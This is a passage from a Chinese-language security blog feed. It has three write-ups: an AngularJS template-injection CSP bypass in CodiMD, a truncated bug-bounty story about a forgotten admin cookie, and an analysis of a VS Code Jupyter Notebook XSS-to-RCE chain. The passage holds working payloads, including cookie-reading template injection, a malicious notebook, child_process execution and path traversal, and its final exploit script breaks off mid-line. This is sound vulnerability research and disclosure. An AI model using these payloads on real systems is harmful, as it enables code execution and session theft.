&lt;li&gt;允许从cdnjs.cloudflare.com加载脚本&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;利用AngularJS 1.0.8的客户端模板注入功能，我们成功绕过CSP：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- foo=&amp;#34;--&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;ng-app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    {{constructor.constructor(&amp;#39;alert(document.cookie)&amp;#39;)()}}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//sssss&amp;#34; --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;蠕虫攻击效果&#34;&gt;蠕虫攻击效果
&lt;/h2&gt;&lt;p&gt;当攻击者与其他用户同时编辑文档时，可对所有查看者执行恶意代码，实现类似Samy Worm的蠕虫传播效果。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;该漏洞已在CodiMD最新版修复，详情参见相关pull request。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>藏在会话中的秘密：一个被遗忘的Cookie如何让我像主人一样走进管理员面板</title>
        <link>http://localhost:1313/p/%E8%97%8F%E5%9C%A8%E4%BC%9A%E8%AF%9D%E4%B8%AD%E7%9A%84%E7%A7%98%E5%AF%86%E4%B8%80%E4%B8%AA%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84cookie%E5%A6%82%E4%BD%95%E8%AE%A9%E6%88%91%E5%83%8F%E4%B8%BB%E4%BA%BA%E4%B8%80%E6%A0%B7%E8%B5%B0%E8%BF%9B%E7%AE%A1%E7%90%86%E5%91%98%E9%9D%A2%E6%9D%BF/</link>
        <pubDate>Wed, 06 Aug 2025 03:34:34 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%97%8F%E5%9C%A8%E4%BC%9A%E8%AF%9D%E4%B8%AD%E7%9A%84%E7%A7%98%E5%AF%86%E4%B8%80%E4%B8%AA%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84cookie%E5%A6%82%E4%BD%95%E8%AE%A9%E6%88%91%E5%83%8F%E4%B8%BB%E4%BA%BA%E4%B8%80%E6%A0%B7%E8%B5%B0%E8%BF%9B%E7%AE%A1%E7%90%86%E5%91%98%E9%9D%A2%E6%9D%BF/</guid>
        <description>&lt;h1 id=&#34;-藏在会话中的秘密一个被遗忘的cookie如何让我像主人一样走进管理员面板-&#34;&gt;🍪 藏在会话中的秘密：一个被遗忘的Cookie如何让我像主人一样走进管理员面板 🔑
&lt;/h1&gt;&lt;p&gt;凌晨2:47，我正喝着第三杯咖啡（也就是所谓的&amp;quot;应对机制&amp;quot;☕），一边看着2008年的CTF演讲视频，一边浏览着某个金融科技目标的侦察输出。就在我准备放弃今晚的工作时，我注意到了一些奇怪的东西 - 一个在欺骗我的注销端点。当注销按钮说谎时，你最好相信它背后藏着宝藏。&lt;/p&gt;
&lt;p&gt;这是一个关于我如何偶然发现一个仍停留在过去的被遗忘Cookie的故事 - 以及这个Cookie如何给我完整管理员权限的故事。&lt;/p&gt;
&lt;h2 id=&#34;-侦察仪式与cookie碎屑&#34;&gt;🔍 侦察仪式与Cookie碎屑
&lt;/h2&gt;&lt;p&gt;我从基本的批量侦察开始 - 没什么特别的：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;subfinder -d target.com | tee subs.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;httpx -l subs.txt -status-code -title -tech-detect &amp;gt; alive.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gau...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;谁需要管理员权限当你有graphql时滥用查询获取乐趣和数据-&#34;&gt;谁需要管理员权限？当你有GraphQL时：滥用查询获取乐趣和数据 🌝📊
&lt;/h2&gt;&lt;p&gt;（文章内容继续&amp;hellip;）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Visual Studio Code Jupyter Notebook远程代码执行漏洞分析</title>
        <link>http://localhost:1313/p/visual-studio-code-jupyter-notebook%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Wed, 06 Aug 2025 03:01:42 +0800</pubDate>
        
        <guid>http://localhost:1313/p/visual-studio-code-jupyter-notebook%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h2 id=&#34;visual-studio-code-jupyter-notebook-rce&#34;&gt;Visual Studio Code Jupyter Notebook RCE
&lt;/h2&gt;&lt;p&gt;2022年10月27日 - Luca Carettoni&lt;/p&gt;
&lt;p&gt;我利用上周末的几个小时研究了Justin Steven于2021年8月发现的Visual Studio Code .ipynb Jupyter Notebook漏洞利用方法。&lt;/p&gt;
&lt;p&gt;Justin发现了一个影响VSCode内置Jupyter Notebook(.ipynb)文件支持的跨站脚本(XSS)漏洞：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;cells&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;cell_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;code&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;execution_count&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;source&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;outputs&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;nt&#34;&gt;&amp;#34;output_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;display_data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;nt&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;text/markdown&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;img src=x onerror=&amp;#39;console.log(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;他的分析详细说明了该问题并展示了一个从磁盘读取任意文件然后将其内容泄露到远程服务器的概念验证，但这并非完整的RCE利用。&lt;/p&gt;
&lt;p&gt;虽然我无法找到利用此XSS原语实现任意代码执行的方法，但更擅长Electron漏洞利用的人或许能够做到。[&amp;hellip;]&lt;/p&gt;
&lt;p&gt;鉴于我们对ElectronJs（以及许多其他Web技术）的关注，我决定研究潜在的利用途径。&lt;/p&gt;
&lt;h3 id=&#34;漏洞利用分析&#34;&gt;漏洞利用分析
&lt;/h3&gt;&lt;p&gt;首先，我查看了应用程序的整体设计，以识别由VSCode使用的每个BrowserWindow/BrowserView/Webview的配置。通过ElectroNG可以观察到，该应用程序使用了一个启用了nodeIntegration的BrowserWindow。&lt;/p&gt;
&lt;p&gt;这个BrowserWindow使用vscode-file协议加载内容，该协议类似于file协议。不幸的是，我们的注入发生在嵌套的沙盒iframe中，如下图所示：&lt;/p&gt;
&lt;p&gt;[沙盒iframe结构示意图]&lt;/p&gt;
&lt;p&gt;具体来说，我们的沙盒iframe使用以下属性创建：
&lt;code&gt;allow-scripts allow-same-origin allow-forms allow-pointer-lock allow-downloads&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;默认情况下，sandbox会使浏览器将iframe视为来自另一个源，即使其src指向同一站点。由于allow-same-origin属性，这个限制被解除。只要webview中加载的内容也托管在本地文件系统（在应用程序文件夹内），我们就可以访问顶层窗口。这样，我们可以简单地使用类似&lt;code&gt;top.require(&#39;child_process&#39;).exec(&#39;open /System/Applications/Calculator.app&#39;)&lt;/code&gt;的代码执行命令。&lt;/p&gt;
&lt;h3 id=&#34;漏洞利用构建&#34;&gt;漏洞利用构建
&lt;/h3&gt;&lt;p&gt;那么，我们如何将任意HTML/JS内容放入应用程序安装文件夹中？或者，我们能否引用该文件夹外的资源？&lt;/p&gt;
&lt;p&gt;答案来自我在Black Hat USA 2022简报会上看到的一个演示。在利用CVE-2021-43908时，TheGrandPew和s1r1us使用路径遍历来加载VSCode安装路径之外的任意文件：
&lt;code&gt;vscode-file://vscode-app/Applications/Visual Studio Code.app/Contents/Resources/app/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F/somefile.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;类似地，我们可以尝试利用postMessage的回复来泄露当前用户目录的路径。实际上，我们的有效载荷可以放在恶意仓库中，与触发XSS的Jupyter Notebook文件一起。&lt;/p&gt;
&lt;p&gt;经过几个小时的尝试，我发现可以通过在onload事件期间强制执行来获取触发XSS的img标签的引用。&lt;/p&gt;
&lt;h3 id=&#34;最终漏洞利用&#34;&gt;最终漏洞利用
&lt;/h3&gt;&lt;p&gt;将所有要素准备好后，我最终组装了完整的漏洞利用代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;apploc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/Applications/Visual Studio Code.app/Contents/Resources/app/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/ /g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;%20&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;repoloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;frames&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;onmessage&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;contents&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;includes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;base href&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;leakloc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;base href=\&amp;#34;(.*)\&amp;#34;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;repoloc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;leakloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://file%2B.vscode-resource.vscode-webview.net&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;vscode-file://vscode-app&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;apploc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;setTimeout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;async&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()=&amp;gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;repoloc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;poc.html&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;repoloc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;poc.html&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;postMessage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;channel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;do-reload&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt;&lt;span 